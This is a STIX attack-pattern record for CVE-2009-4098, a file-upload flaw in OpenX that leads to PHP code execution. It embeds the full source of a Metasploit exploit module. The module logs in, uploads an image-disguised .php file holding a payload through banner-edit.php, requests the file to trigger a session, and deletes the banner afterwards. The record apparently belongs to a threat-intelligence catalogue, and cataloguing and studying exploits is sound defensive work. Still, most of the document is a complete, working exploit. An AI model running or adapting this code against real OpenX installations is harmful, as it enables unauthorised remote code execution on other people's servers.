{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71372be6-4bb0-4b0f-8082-5832f521e002",
    "created": "2024-08-14T17:12:26.316257Z",
    "modified": "2024-08-14T17:12:26.316272Z",
    "name": "OpenX banner-edit.php File Upload PHP Code Execution",
    "description": " This module exploits a vulnerability in the OpenX advertising software. In versions prior to version 2.8.2, authenticated users can upload files with arbitrary extensions to be used as banner creative content. By uploading a file with a PHP extension, an attacker can execute arbitrary PHP code.  NOTE: The file must also return either \"png\", \"gif\", or \"jpeg\" as its image type as returned from the PHP getimagesize() function. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/openx_banner_edit.rb",
            "external_id": "openx_banner_edit.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4098"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2009-11/0166.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.openx.org/docs/2.8/release-notes/openx-2.8.2"
        },
        {
            "source_name": "reference",
            "url": "http://php.net/manual/en/function.getimagesize.php"
        },
        {
            "source_name": "reference",
            "url": "http://gynvael.coldwind.pl/?id=223"
        },
        {
            "source_name": "reference",
            "url": "http://gynvael.coldwind.pl/?id=224"
        },
        {
            "source_name": "reference",
            "url": "http://gynvael.coldwind.pl/?id=235"
        },
        {
            "source_name": "reference",
            "url": "http://programming.arantius.com/the+smallest+possible+gif"
        },
        {
            "source_name": "reference",
            "url": "http://stackoverflow.com/questions/2253404/what-is-the-smallest-valid-jpeg-file-size-in-bytes"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OpenX banner-edit.php File Upload PHP Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the OpenX advertising software.\n        In versions prior to version 2.8.2, authenticated users can upload files\n        with arbitrary extensions to be used as banner creative content. By uploading\n        a file with a PHP extension, an attacker can execute arbitrary PHP code.\n\n        NOTE: The file must also return either \"png\", \"gif\", or \"jpeg\" as its image\n        type as returned from the PHP getimagesize() function.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4098' ],\n          [ 'OSVDB', '60499' ],\n          [ 'BID', '37110' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2009-11/0166.html' ],\n          [ 'URL', 'http://www.openx.org/docs/2.8/release-notes/openx-2.8.2' ],\n          # References for making small images:\n          [ 'URL', 'http://php.net/manual/en/function.getimagesize.php' ],\n          [ 'URL', 'http://gynvael.coldwind.pl/?id=223' ],\n          [ 'URL', 'http://gynvael.coldwind.pl/?id=224' ],\n          [ 'URL', 'http://gynvael.coldwind.pl/?id=235' ],\n          [ 'URL', 'http://programming.arantius.com/the+smallest+possible+gif' ],\n          [ 'URL', 'http://stackoverflow.com/questions/2253404/what-is-the-smallest-valid-jpeg-file-size-in-bytes' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'Space'       => 1024,\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2009-11-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"OpenX directory path\", \"/openx/\"]),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as' ]),\n        OptString.new('PASSWORD', [ true, 'The password for the specified username' ]),\n        OptString.new('DESC', [ true, 'The description to use for the banner', 'Temporary banner']),\n      ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'], 'www', 'admin/')\n    res = send_request_raw(\n      {\n        'uri' => uri\n      }, 25)\n\n    if (res and res.body =~ /v.?([0-9]\\.[0-9]\\.[0-9])/)\n      ver = $1\n      vers = ver.split('.').map { |v| v.to_i }\n      return Exploit::CheckCode::Safe if (vers[0] > 2)\n      return Exploit::CheckCode::Safe if (vers[1] > 8)\n      return Exploit::CheckCode::Safe if (vers[0] == 2 && vers[1] == 8 && vers[2] >= 2)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    # tiny images :)\n    tiny_gif = \"GIF89a\" +\n      \"\\x01\\x00\\x01\\x00\\x00\" +\n      [1,1,0x80|(2**(2+rand(3)))].pack('nnC') +\n      \"\\xff\\xff\\xff\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02\\x44\\x01\\x00\\x3b\"\n    tiny_png = \"\\x89PNG\\x0d\\x0a\\x1a\\x0a\" +\n      rand_text_alphanumeric(8) +\n      [1,1,0].pack('NNC')\n    tiny_jpeg = \"\\xff\\xd8\\xff\\xff\" +\n      [0xc0|rand(16), rand(8), 2**(2+rand(3)), 1, 1, 1].pack('CnCnnC')\n    tiny_imgs = [ tiny_gif, tiny_png, tiny_jpeg ]\n\n    # Payload\n    cmd_php = '<?php ' + payload.encoded + '?>'\n    content = tiny_imgs[rand(tiny_imgs.length)] + cmd_php\n\n    # Static files\n    img_dir     = 'images/'\n    uri_base    = normalize_uri(datastore['URI'], 'www/')\n\n    # Need to login first :-/\n    cookie = openx_login(uri_base)\n    if (not cookie)\n      fail_with(Failure::Unknown, 'Unable to login!')\n    end\n    print_good(\"Logged in successfully (cookie: #{cookie})\")\n\n    # Now, check for an advertiser / campaign\n    ids = openx_find_campaign(uri_base, cookie)\n    if (not ids)\n      # TODO: try to add an advertiser and/or campaign\n      fail_with(Failure::Unknown, 'The system has no advertisers or campaigns!')\n    end\n    adv_id = ids[0]\n    camp_id = ids[1]\n    print_status(\"Using advertiser #{adv_id} and campaign #{camp_id}\")\n\n    # Add the banner >:)\n    ban_id = openx_upload_banner(uri_base, cookie, adv_id, camp_id, content)\n    if (not ban_id)\n      fail_with(Failure::Unknown, 'Unable to upload the banner!')\n    end\n    print_good(\"Successfully uploaded the banner image with id #{ban_id}\")\n\n    # Find the filename\n    ban_fname = openx_find_banner_filename(uri_base, cookie, adv_id, camp_id, ban_id)\n    if (not ban_fname)\n      fail_with(Failure::Unknown, 'Unable to find the banner filename!')\n    end\n    print_status(\"Resolved banner id to name: #{ban_fname}\")\n\n    # Request it to trigger the payload\n    res = send_request_raw({\n        'uri' => uri_base + 'images/' + ban_fname + '.php'\n      })\n\n    # Delete the banner :)\n    if (not openx_banner_delete(uri_base, cookie, adv_id, camp_id, ban_id))\n      print_warning(\"WARNING: Unable to automatically delete the banner :-/\")\n    else\n      print_good(\"Successfully deleted banner # #{ban_id}\")\n    end\n\n    print_status(\"You should have a session now.\")\n\n    handler\n\n  end\n\n\n  def openx_login(uri_base)\n\n    res = send_request_raw(\n      {\n        'uri' => normalize_uri(uri_base, 'admin/index.php')\n      }, 10)\n    if not (res and res.body =~ /oa_cookiecheck\\\" value=\\\"([^\\\"]+)\\\"/)\n      return nil\n    end\n    cookie = $1\n\n    res = send_request_cgi(\n      {\n        'method'    => 'POST',\n        'uri'       => normalize_uri(uri_base, 'admin/index.php'),\n        'vars_post' =>\n          {\n            'oa_cookiecheck' => cookie,\n            'username' => datastore['USERNAME'],\n            'password' => datastore['PASSWORD'],\n            'login' => 'Login'\n          },\n        'headers'   =>\n          {\n            'Cookie'  => \"sessionID=#{cookie}; PHPSESSID=#{cookie}\",\n          },\n      }, 10)\n    if (not res or res.code != 302)\n      return nil\n    end\n\n    # return the cookie\n    cookie\n  end\n\n\n  def openx_find_campaign(uri_base, cookie)\n    res = send_request_raw(\n      {\n        'uri' => normalize_uri(uri_base, 'admin/advertiser-campaigns.php'),\n        'headers' =>\n          {\n            'Cookie' => \"sessionID=#{cookie}; PHPSESSID=#{cookie}\",\n          },\n      })\n    if not (res and res.body =~ /campaign-edit\\.php\\?clientid=([^&])&campaignid=([^\\'])\\'/)\n      return nil\n    end\n\n    adv_id = $1.to_i\n    camp_id = $2.to_i\n\n    [ adv_id, camp_id ]\n  end\n\n\n  def mime_field(boundary, name, data, filename = nil, type = nil)\n    ret = ''\n    ret << '--' + boundary + \"\\r\\n\"\n    ret << \"Content-Disposition: form-data; name=\\\"#{name}\\\"\"\n    if (filename)\n      ret << \"; filename=\\\"#{filename}\\\"\"\n    end\n    ret << \"\\r\\n\"\n    if (type)\n      ret << \"Content-Type: #{type}\\r\\n\"\n    end\n    ret << \"\\r\\n\"\n    ret << data + \"\\r\\n\"\n    ret\n  end\n\n\n  def openx_upload_banner(uri_base, cookie, adv_id, camp_id, code_img)\n    # Generate some random strings\n    boundary    = ('-' * 8) + rand_text_alphanumeric(32)\n    cmdscript   = rand_text_alphanumeric(8+rand(8))\n\n    # Upload payload (file ending .php)\n    data = \"\"\n    data << mime_field(boundary, \"_qf__bannerForm\", \"\")\n    data << mime_field(boundary, \"clientid\", adv_id.to_s)\n    data << mime_field(boundary, \"campaignid\", camp_id.to_s)\n    data << mime_field(boundary, \"bannerid\", \"\")\n    data << mime_field(boundary, \"type\", \"web\")\n    data << mime_field(boundary, \"status\", \"\")\n    data << mime_field(boundary, \"MAX_FILE_SIZE\", \"2097152\")\n    data << mime_field(boundary, \"replaceimage\", \"t\")\n    data << mime_field(boundary, \"replacealtimage\", \"t\")\n    data << mime_field(boundary, \"description\", datastore['DESC'])\n    data << mime_field(boundary, \"upload\", code_img, \"#{cmdscript}.php\", \"application/octet-stream\")\n    data << mime_field(boundary, \"checkswf\", \"1\")\n    data << mime_field(boundary, \"uploadalt\", \"\", \"\", \"application/octet-stream\")\n    data << mime_field(boundary, \"url\", \"http://\")\n    data << mime_field(boundary, \"target\", \"\")\n    data << mime_field(boundary, \"alt\", \"\")\n    data << mime_field(boundary, \"statustext\", \"\")\n    data << mime_field(boundary, \"bannertext\", \"\")\n    data << mime_field(boundary, \"keyword\", \"\")\n    data << mime_field(boundary, \"weight\", \"1\")\n    data << mime_field(boundary, \"comments\", \"\")\n    data << mime_field(boundary, \"submit\", \"Save changes\")\n    #data << mime_field(boundary, \"\", \"\")\n    data << '--' + boundary + '--'\n\n    res = send_request_raw(\n      {\n        'uri'     => normalize_uri(uri_base, \"admin/banner-edit.php\"),\n        'method'  => 'POST',\n        'data'    => data,\n        'headers' =>\n          {\n            'Content-Length' => data.length,\n            'Content-Type'   => 'multipart/form-data; boundary=' + boundary,\n            'Cookie'         => \"sessionID=#{cookie}; PHPSESSID=#{cookie}\",\n          }\n      }, 25)\n\n    if not (res and res.code == 302 and res.headers['Location'] =~ /campaign-banners\\.php/)\n      return nil\n    end\n\n    # Ugh, now we have to get the banner id!\n    res = send_request_raw(\n      {\n        'uri'     => normalize_uri(uri_base, \"admin/campaign-banners.php\") + \"?clientid=#{adv_id}&campaignid=#{camp_id}\",\n        'method'  => 'GET',\n        'headers' =>\n          {\n            'Cookie' => \"sessionID=#{cookie}; PHPSESSID=#{cookie}\",\n          }\n      })\n\n    if not (res and res.body.length > 0)\n      return nil\n    end\n\n    res.body.each_line { |ln|\n      # make sure the title we used is on this line\n      regexp = Regexp.escape(datastore['DESC'])\n      next if not (ln =~ /#{regexp}/)\n\n      next if not (ln =~ /banner-edit\\.php\\?clientid=#{adv_id}&campaignid=#{camp_id}&bannerid=([^\\']+)\\'/)\n\n      # found it! (don't worry about dupes)\n      return $1.to_i\n    }\n\n    # Didn't find it :-/\n    nil\n  end\n\n\n  def openx_find_banner_filename(uri_base, cookie, adv_id, camp_id, ban_id)\n    # Ugh, now we have to get the banner name too!\n    res = send_request_raw(\n      {\n        'uri'     => normalize_uri(uri_base, \"admin/banner-edit.php\") + \"?clientid=#{adv_id}&campaignid=#{camp_id}&bannerid=#{ban_id}\",\n        'method'  => 'GET',\n        'headers' =>\n          {\n            'Cookie' => \"sessionID=#{cookie}; PHPSESSID=#{cookie}\",\n          }\n      })\n\n    if not (res and res.body =~ /\\/www\\/images\\/([0-9a-f]+)\\.php/)\n      return nil\n    end\n\n    return $1\n  end\n\n\n  def openx_banner_delete(uri_base, cookie, adv_id, camp_id, ban_id)\n    res = send_request_raw(\n      {\n        'uri'     => normalize_uri(uri_base, \"admin/banner-delete.php\") + \"?clientid=#{adv_id}&campaignid=#{camp_id}&bannerid=#{ban_id}\",\n        'method'  => 'GET',\n        'headers' =>\n          {\n            'Cookie' => \"sessionID=#{cookie}; PHPSESSID=#{cookie}\",\n          }\n      })\n\n    if not (res and res.code == 302 and res.headers['Location'] =~ /campaign-banners\\.php/)\n      return nil\n    end\n\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-24",
    "x_mitre_platforms": [
        "php'"
    ]
}